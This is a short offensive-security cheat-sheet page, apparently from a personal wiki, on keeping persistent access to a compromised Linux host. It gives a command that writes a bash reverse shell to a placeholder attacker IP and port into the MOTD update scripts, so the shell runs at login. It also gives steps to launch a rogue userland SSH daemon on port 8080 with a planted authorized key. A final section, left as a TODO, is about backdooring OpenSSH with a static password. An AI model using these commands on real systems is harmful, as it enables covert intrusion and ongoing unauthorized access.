---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - network-protocols
  - ssh
  - linux
---
# Living off the Land

## 01 - Message of the Day (MOTD)

```
# cat >> /etc/update-motd.d/00-header << EOF
bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' &
EOF
```

## 02 - Run SSH Server as Userland

Instead of dropping external binaries, reverse shells, or modifying firewall configuration with elevated permissions. Just executing the SSH daemon service greater than port 1023 or allowing incoming network traffic depending on the firewall configuration (e.g. `8080` HTTP proxy) to setup a temporary working directory in a multiplexer ([[Tmux|`tmux`]] or [[Screen|`screen`]]) in the background.

```
$ mkdir -p ~/.ssh 2>/dev/null
ssh-keygen -q -N "" -t ed25519 -f sshd_key
cat sshd_key.pub >> ~/.ssh/authorized_keys
cat sshd_key && rm -f sshd_key
$(command -v sshd) -f /dev/null -o HostKey=$(pwd)/sshd_key -o GatewayPorts=yes -p 8080
```

## 03 - Backdoor OpenSSH Server

TODO: Show the steps to modify the source code and then compile it by inserting a static username and password to always authenticate.

---
## References

### Backlinks

- [[Linux Post Exploitation Persistence References]]

### Github

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

### Pikami

- [Pikami: Backdooring OpenSSH Server](https://pikami.org/blog/backdooring-openssh-server/)